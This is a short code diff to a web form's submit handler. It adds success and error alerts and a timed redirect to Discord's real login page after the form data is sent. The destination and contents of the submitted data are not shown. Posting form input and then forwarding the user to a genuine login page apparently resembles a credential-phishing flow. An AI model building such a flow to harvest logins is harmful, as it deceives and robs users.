@@ -74,15 +74,22 @@ form.addEventListener("submit", async (e) => {
     });
 
     if (res.ok) {
+      alert("✅ Sent successfully! Redirecting to Discord...");
       form.reset();
-      // ✅ Redirect to Discord login page after successful submission
-      window.location.href = "https://discord.com/login";
+
+      // Delay bago mag-redirect para makita ng user alert
+      setTimeout(() => {
+        window.location.href = "https://discord.com/login";
+      }, 1500);
+
     } else {
       const text = await res.text();
       console.error("Server error:", text);
+      alert("❌ Error sending data: " + res.status);
     }
   } catch (err) {
     console.error("Network error:", err);
+    alert("❌ Network error, check console.");
   }
 });
 </script>
